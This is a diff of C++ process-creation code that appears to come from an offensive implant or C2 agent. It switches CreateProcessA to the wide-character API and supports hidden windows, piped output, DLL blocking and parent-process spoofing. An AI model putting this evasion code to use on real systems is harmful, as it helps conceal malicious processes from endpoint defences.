@@ -27,7 +27,7 @@ auto DECLFN Process::Open(
 }
 
 auto DECLFN Process::Create(
-    _In_  PCHAR                CommandLine,
+    _In_  WCHAR*               CommandLine,
     _In_  ULONG                InheritHandles,
     _In_  ULONG                PsFlags,
     _Out_ PPROCESS_INFORMATION PsInfo
@@ -42,16 +42,19 @@ auto DECLFN Process::Create(
     ULONG  PipeBuffSize = 0;
     UINT8  UpdateCount  = 0;
 
+    ULONG BypassSize  = 0;
+    PBYTE BypassBuff  = nullptr;
+
     LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff = nullptr;
     UPTR                         AttrSize;
 
-    STARTUPINFOEXA      SiEx         = { 0 };
+    STARTUPINFOEXW      SiEx         = { 0 };
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };
 
     if ( Self->Config.Ps.BlockDlls ) { UpdateCount++; };
     if ( Self->Config.Ps.ParentID  ) { UpdateCount++; };
 
-    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
+    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXW );
     SiEx.StartupInfo.wShowWindow = SW_HIDE;
 
     PsFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
@@ -118,19 +121,18 @@ auto DECLFN Process::Create(
             SiEx.StartupInfo.hStdOutput = PipeWrite;
         }
     }
-
-    Success = Self->Krnl32.CreateProcessA(
+    
+    Success = Self->Krnl32.CreateProcessW(
         nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
         nullptr, Self->Config.Ps.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
+    if ( ! Success ) { 
+        return Cleanup(); 
+    }
 
     if ( PipeWrite ) {
         Self->Ntdll.NtClose( PipeWrite );
         PipeWrite = nullptr;
-    }
-
-    if ( ! Success ) { 
-        return Cleanup(); 
     }
 
     if ( Self->Config.Ps.Pipe ) {
